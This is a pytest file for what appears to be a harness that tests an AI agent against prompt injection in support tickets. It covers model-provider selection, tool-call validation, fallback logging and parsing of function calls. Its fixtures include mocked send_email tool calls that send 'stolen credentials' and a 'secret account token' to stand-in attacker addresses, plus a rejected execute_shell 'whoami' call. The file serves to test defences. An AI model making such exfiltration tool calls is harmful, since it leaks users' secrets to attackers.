import os
import pytest
from unittest.mock import patch, MagicMock
from backend.app.schemas.contracts import (
    RunContext,
    ExecutionMode,
    EventType,
    ActorRole,
    RelationType,
)
from backend.app.agent.model_adapter import (
    LiveModelAdapter,
    GeminiProvider,
    GroqProvider,
    OpenAIProvider,
    ToolCallRequest,
)
from backend.app.agent.target_agent import TargetAgent
from backend.app.tools.mock_tools import MockEnvironment, MockToolAdapter
from backend.app.policy.policy_engine import PolicyEngine

def test_model_provider_selection_and_priority():
    """Verify provider selection matches priority (Gemini -> Groq -> OpenAI) and explicit requests."""
    env = MockEnvironment()
    adapter = MockToolAdapter(env)

    # 1. Test explicit requested provider
    with patch.dict(os.environ, {"GEMINI_API_KEY": "test-gemini-key", "GROQ_API_KEY": "test-groq-key"}):
        live_adapter = LiveModelAdapter(adapter)
        gemini = live_adapter.get_configured_provider("gemini")
        assert isinstance(gemini, GeminiProvider)
        assert gemini.name == "gemini"

        groq = live_adapter.get_configured_provider("groq")
        assert isinstance(groq, GroqProvider)
        assert groq.name == "groq"

    # 2. Test fallback priority when none specified
    with patch.dict(os.environ, {"GROQ_API_KEY": "test-groq-key", "OPENAI_API_KEY": "test-openai-key"}, clear=True):
        live_adapter = LiveModelAdapter(adapter)
        prov = live_adapter.get_configured_provider()
        # Without gemini, Groq is next in priority
        assert isinstance(prov, GroqProvider)


def test_backend_tool_call_argument_validation():
    """Backend must strictly validate tool name and required schema arguments before execution."""
    # Valid send_email
    valid_email, err = LiveModelAdapter.validate_tool_call(
        "send_email",
        {"recipient": "exfil@attacker.invalid", "content": "Stolen credentials"},
    )
    assert valid_email is True
    assert err is None

    # Invalid send_email (missing @ in recipient)
    invalid_email, err = LiveModelAdapter.validate_tool_call(
        "send_email",
        {"recipient": "not-an-email", "content": "Data"},
    )
    assert invalid_email is False
    assert "recipient" in err

    # Invalid send_email (empty content)
    empty_content, err = LiveModelAdapter.validate_tool_call(
        "send_email",
        {"recipient": "victim@example.com", "content": ""},
    )
    assert empty_content is False
    assert "content" in err

    # Valid lookup_customer
    valid_lookup, err = LiveModelAdapter.validate_tool_call(
        "lookup_customer",
        {"customer_id": "cust_123"},
    )
    assert valid_lookup is True
    assert err is None

    # Invalid lookup_customer (missing customer_id)
    invalid_lookup, err = LiveModelAdapter.validate_tool_call(
        "lookup_customer",
        {},
    )
    assert invalid_lookup is False
    assert "customer_id" in err

    # Unknown tool
    unknown_tool, err = LiveModelAdapter.validate_tool_call(
        "execute_shell",
        {"cmd": "whoami"},
    )
    assert unknown_tool is False
    assert "Unknown tool" in err


def test_fallback_provenance_when_live_model_fails():
    """If live model execution fails, a MODEL_FALLBACK event must be emitted and run must be marked deterministic."""
    env = MockEnvironment()
    adapter = MockToolAdapter(env)
    target_agent = TargetAgent(adapter)

    context = RunContext(
        run_id="test-fallback-run",
        scenario_id="support-ticket-injection",
        execution_mode=ExecutionMode.LIVE_MODEL,
        provider="gemini",
        model="gemini-2.0-flash",
    )

    # Configure live mode with a dummy key, but simulate provider failure
    with patch.dict(os.environ, {"MODE": "live", "GEMINI_API_KEY": "mock-key-for-test"}):
        agent_with_live = TargetAgent(adapter)
        assert agent_with_live.model_adapter.is_live_configured is True

        # Mock GeminiProvider.invoke to raise an API error
        with patch.object(GeminiProvider, "invoke", side_effect=RuntimeError("Google API 403 Forbidden: Invalid API Key")):
            res = agent_with_live.execute(
                ticket_id="ticket_malicious_seed",
                context=context,
            )

    # 1. Context execution_mode must have switched to deterministic
    assert context.execution_mode == ExecutionMode.DETERMINISTIC

    # 2. Result mode must clearly indicate deterministic fallback
    assert res.get("mode") == "deterministic_fallback"
    assert "Invalid API Key" in res.get("fallback_reason", "")

    # 3. Emitted events must contain explicit MODEL_FALLBACK event
    fallback_events = [e for e in env.events if e.event_type == EventType.MODEL_FALLBACK]
    assert len(fallback_events) == 1
    fallback_evt = fallback_events[0]
    assert fallback_evt.actor == ActorRole.OPERATOR
    assert fallback_evt.relation_type == RelationType.FALLBACK_TO
    assert fallback_evt.arguments_json["attempted_provider"] == "gemini"
    assert "RuntimeError" in fallback_evt.arguments_json["error_type"]


def test_gemini_provider_function_call_parsing():
    """Verify GeminiProvider parses candidate functionCall parts correctly."""
    provider = GeminiProvider(api_key="test-key", model="gemini-2.0-flash")

    mock_gemini_json = {
        "candidates": [
            {
                "content": {
                    "parts": [
                        {
                            "functionCall": {
                                "name": "send_email",
                                "args": {
                                    "recipient": "attacker@darkweb.org",
                                    "content": "Secret account token",
                                },
                            }
                        }
                    ]
                }
            }
        ]
    }

    mock_client = MagicMock()
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = mock_gemini_json
    mock_client.post.return_value = mock_resp

    with patch("httpx.Client") as mock_client_cls:
        mock_client_cls.return_value.__enter__.return_value = mock_client

        response = provider.invoke(
            system_prompt="You are an assistant",
            user_prompt="Send the secret",
        )

    assert response.success is True
    assert len(response.tool_calls) == 1
    tc = response.tool_calls[0]
    assert tc.tool_name == "send_email"
    assert tc.arguments["recipient"] == "attacker@darkweb.org"
    assert tc.arguments["content"] == "Secret account token"


def test_groq_provider_tool_calls_parsing():
    """Verify GroqProvider parses OpenAI-compatible tool_calls correctly."""
    provider = GroqProvider(api_key="test-key", model="llama-3.3-70b-versatile")

    mock_groq_json = {
        "choices": [
            {
                "message": {
                    "content": None,
                    "tool_calls": [
                        {
                            "id": "call_abc123",
                            "type": "function",
                            "function": {
                                "name": "lookup_customer",
                                "arguments": '{"customer_id": "cust_999"}',
                            },
                        }
                    ],
                }
            }
        ]
    }

    mock_client = MagicMock()
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = mock_groq_json
    mock_client.post.return_value = mock_resp

    with patch("httpx.Client") as mock_client_cls:
        mock_client_cls.return_value.__enter__.return_value = mock_client

        response = provider.invoke(
            system_prompt="You are an assistant",
            user_prompt="Check customer 999",
        )

    assert response.success is True
    assert len(response.tool_calls) == 1
    tc = response.tool_calls[0]
    assert tc.tool_name == "lookup_customer"
    assert tc.arguments["customer_id"] == "cust_999"
